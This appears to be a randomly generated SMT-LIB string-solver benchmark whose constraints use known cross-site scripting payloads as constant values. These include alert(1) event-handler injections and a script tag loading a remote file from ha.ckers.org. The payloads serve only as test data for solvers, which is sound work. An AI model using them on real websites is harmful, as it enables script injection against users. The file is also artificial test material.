; random_mix, Unicode mode: x, z from disjunctions of constants, y = x ++ z, clauses of 1 to 3 random (negated) constraints of x, y, z: memberships, affixes, contains, lengths, str.at, str.indexof, str.substr, str.replace
(set-logic QF_SLIA)
(set-info :status sat)
(declare-const x String)
(declare-const y String)
(declare-const z String)
(assert (or (= x "<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>") (= x "<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationend=""alert(1)""></listing>") (= x "<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>")))
(assert (or (= z "yle><noembed style=""animation-name:x"" onanimationend=""alert(1)""></noembed>") (= z "ad=alert(1)></marquee>")))
(assert (= y (str.++ x z)))
(assert (or (not (str.prefixof "<style>" y)) (str.suffixof "d>" y)))
(assert (or (= (str.len z) 22) (not (str.prefixof "<style>@ke" x))))
(assert (not (= "<SCRIPT aalert(1)>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>yle><noembed style=""animation-name:x"" onanimationend=""alert(1)""></noembed>" (str.replace y "=`" "alert(1)"))))
(assert (not (str.contains y "me o")))
(assert (or (str.in_re z ((_ re.from_regex ecma2020 u) "^[a-zA-Z\s\-]+$")) (not (= (str.at x 35) "o"))))
(assert (or (str.contains (str.replace z "matio" " ") """ani n-n") (str.in_re y ((_ re.from_regex ecma2020 u) "^((8|\+7)[\- ]?)?(\(?\d{3}\)?[\- ]?)?[\d\- ]{5,10}$"))))
(assert (or (= "<progress id=x tabin1 onfocus=alert(1)></progress>ert(1\u{10348})</script>"">" (str.replace y "dex=" "")) (= (str.indexof z "nim" 0) 21)))
(check-sat)
